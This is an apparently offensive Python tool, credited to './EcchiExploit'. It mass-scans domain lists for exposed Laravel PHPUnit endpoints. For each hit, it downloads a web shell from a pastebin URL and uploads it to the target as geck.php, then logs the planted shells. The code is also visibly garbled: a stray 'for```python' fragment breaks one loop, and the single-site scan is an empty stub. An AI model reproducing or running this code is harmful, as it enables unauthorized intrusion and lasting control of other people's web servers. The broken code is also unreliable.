import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

class PhpUnitScanner:
    def __init__(self):
        self.base_url = "http://"
        self.endpoint_list_url = "https://raw.githubusercontent.com/rabeltester44/phpunitchecker/refs/heads/main/phpunit.txt"
        self.user_agents = self.load_user_agents("user-agent.txt")

    def load_user_agents(self, filename):
        try:
            with open(filename, 'r') as file:
                return [line.strip() for line in file.readlines() if line.strip()]
        except FileNotFoundError:
            print(f"User agent file {filename} not found.")
            return []

    def save(self, save, name):
        with open(name, "a+") as result_file:
            result_file.write(f"{save}\n")

    def check_url(self, web):
        headers = {'User-Agent': self.user_agents[0]} if self.user_agents else {}
        try:
            response = requests.head(web, headers=headers, allow_redirects=True, timeout=5)
            if response.status_code == 200:
                return web, True
        except requests.RequestException:
            return web, False
        return web, False

    def inject_shell(self, target_url):
        # Create the path for the web shell
        webshell_path = target_url + "/geck.php"
        try:
            # Download the web shell
            response = requests.get('https://pastebin.com/raw/k51UcJH1')
            if response.status_code == 200:
                # Save the web shell locally
                with open('geck.php', 'wb') as shell_file:
                    shell_file.write(response.content)

                # Upload the web shell to the target URL
                with open('geck.php', 'rb') as file_to_upload:
                    upload_response = requests.post(webshell_path, files={'file': file_to_upload})

                if upload_response.status_code == 200:
                    self.save(f"Shell injected at: {webshell_path}", "webshell.txt")
                    print(f"\033[32m[+] Shell injected at: {webshell_path}\033[0m")
            else:
                print(f"Failed to download the web shell: {response.status_code}")
        except Exception as e:
            print(f"Error injecting shell: {e}")

    def mass_laravel(self, domain):
        full_url = self.base_url + domain
        valid_found = False  # Track if any valid URL is found
        try:
            response = requests.get(self.endpoint_list_url, timeout=5)
            response.raise_for_status()
            endpoints = response.text.splitlines()
        except requests.RequestException as e:
            print(f"Failed to retrieve the list of endpoints: {e}")
            return

        with ThreadPoolExecutor(max_workers=100) as executor:
            future_to_url = {executor.submit(self.check_url, full_url + endpoint.strip()): endpoint for endpoint in endpoints if endpoint.strip()}
            for future in as_completed(future_to_url):
                endpoint = future_to_url[future]
                web = full_url + endpoint.strip()
                try:
                    url, found = future.result()
                    if found:
                        if not valid_found:  # Only print valid URLs once
                            valid_found = True
                        print(f"\033[32m[+] Found => {url}\033[0m")
                        self.save(url, "result.txt")
                        self.inject_shell(url)  # Inject shell when a valid path is found
                    else:
                        if not valid_found:  # Suppress output for invalid paths if a valid one is found
                            print(f"\033[31mNot Found => {web}\033[0m")
                except Exception as e:
                    print(f"Error checking {web}: {e}")

    def laravel(self, domain):
        # Similar to mass_laravel, but for a single domain
        pass  # Implementation omitted for brevity

    def choose_option(self):
        print("\n\t<!> Scan Laravel Phpunit Coded By ./EcchiExploit <!>")
        print("\nNote: Don't Change http:// Or https://")
        print("1. Mass Scan Laravel Phpunit")
        print("2. Scan Laravel Phpunit No Mass")
        option = input("\nChose Your 1/2 => ").strip()

        if option == '1':
            file_path = input("Your List site => ").strip()
            try:
                with open(file_path, 'r') as file:
                    domains = file.readlines()
                for```python
                for domain in domains:
                    self.mass_laravel(domain.strip())
            except FileNotFoundError:
                print(f"File List {file_path} Not Found")
        elif option == '2':
            domain = input("Your Site => ").strip()
            self.laravel(domain)
        else:
            print("\n\tWhat happened??\n")

if __name__ == "__main__":
    scanner = PhpUnitScanner()
    scanner.choose_option()
